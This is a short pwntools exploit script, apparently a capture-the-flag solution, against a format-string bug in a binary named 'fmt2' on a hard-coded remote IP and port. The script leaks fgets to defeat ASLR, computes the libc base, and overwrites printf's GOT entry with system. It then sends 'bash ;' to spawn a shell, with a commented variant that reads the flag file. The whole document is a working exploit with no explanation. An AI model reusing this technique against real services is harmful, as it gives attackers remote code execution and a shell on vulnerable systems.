from pwn import *

binary = "./fmt2"
context.binary = binary
elf = ELF(binary)
libc = ELF('./libc.so.6')

# ABCD %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
def solve():
    # p = process()
    ip = "104.248.97.237"
    # p = remote("localhost", 2005)
    p = remote(ip, 1348)
    p.sendline(b'-1')
    line = p.recvlines(2)[1]
    leaked_fgets = int(line.split(b'0x')[1], 16)
    libc_base = leaked_fgets - libc.sym.fgets
    libc.address = libc_base
    print("libc base:", hex(libc_base), hex(libc.sym.system))
    
    # add 8 bytes 'cat fl*;', increase offset by 1 because of the extra 8 bytes on stack, make sure to adjust numbwritten
    # pay = b'cat fl*;' + fmtstr_payload(6+1,{elf.got.printf: libc.sym.system},numbwritten=8, write_size="short") 
    pay = b'bash   ;' + fmtstr_payload(6+1,{elf.got.printf: libc.sym.system},numbwritten=8, write_size="short") 
    print("pay:", pay)
    with open('input.txt' , 'wb') as f:
        f.write(pay)
    p.sendline(pay)
    p.interactive()
    p.close()

solve()
